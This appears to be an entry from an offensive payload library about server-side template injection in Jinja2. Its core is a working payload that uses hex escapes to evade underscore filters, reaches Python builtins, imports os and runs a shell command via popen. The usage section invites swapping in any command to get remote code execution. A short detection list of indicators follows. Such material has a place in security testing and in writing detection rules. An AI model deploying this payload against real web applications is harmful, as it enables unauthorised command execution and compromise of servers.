---
id: e4e13471-cde9-4211-b04f-5d0aea6301ee
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:39.901858+00:00'
updated_at: '2023-04-10T20:23:43.898447+00:00'
platforms:
  - Web
tags:
  - jinja2
  - ssti
  - rce
validated: true
---

# jinja2-ssti-os-command-execution

## Code

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}} 
```

## Description

Advanced SSTI chain starting from request to access globals, builtins, import os, and execute 'id' command via popen/read, achieving RCE while using hex escapes to bypass underscore filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| command | OS command to execute | id |

## Usage

Inject after __class__ access; replace 'id' with any command (e.g., 'ls', 'whoami'). Demonstrates full RCE post-bypass.

## Detection

- Hex-escaped strings in input (\x5f for _).
- Unexpected os.popen calls in template execution logs.
- Server process spawning from web app context.

## Related

- [[procedures/Bypass-Jinja2-Filters-for-SSTI-Code-Execution]]
